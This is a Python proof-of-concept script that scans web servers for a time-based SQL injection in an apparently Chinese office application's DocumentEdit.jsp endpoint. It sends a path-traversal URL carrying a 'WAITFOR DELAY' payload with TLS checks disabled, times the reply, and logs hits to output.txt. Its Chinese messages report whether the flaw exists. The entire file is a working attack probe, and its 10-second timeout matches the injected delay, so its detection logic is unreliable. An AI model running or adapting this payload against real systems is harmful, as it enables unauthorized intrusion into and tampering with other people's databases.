import requests
from urllib.parse import urljoin
import urllib3
import time
urllib3.disable_warnings()
from colorama import init,Fore
init(autoreset=True)


def poc(url):
    try:
        target = urljoin(url,"/defaultroot/iWebOfficeSign/OfficeServer.jsp/../../public/iSignatureHTML.jsp/DocumentEdit.jsp?DocumentID=1';WAITFOR%20DELAY%20'0:0:10'--")
        header = {
            'Accept-Encoding': 'gzip, deflate',
            'Accept': '*/*',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0',
            'Connection': 'close'
            ''
        }
        start_time = time.time()
        res = requests.get(url=target,headers=header,verify=False,timeout=10) 
        end_time = time.time()            
        res_time = end_time - start_time
        if res.status_code == 200:
            if res_time > 10:
                print(Fore.GREEN + url +'[+]存在DocumentEditSQL注入漏洞漏洞')  
                with open(r'output.txt', 'a+') as w:
                    w.write(url+"存在DocumentEditSQL注入漏洞漏洞"'\n')
                print("[" + "-" * 80 + "]")
            else: 
                print(Fore.RED + url +'[-]不存在漏洞')
                print("[" + "-" * 80 + "]")
    except Exception as err:
        print(err)
    
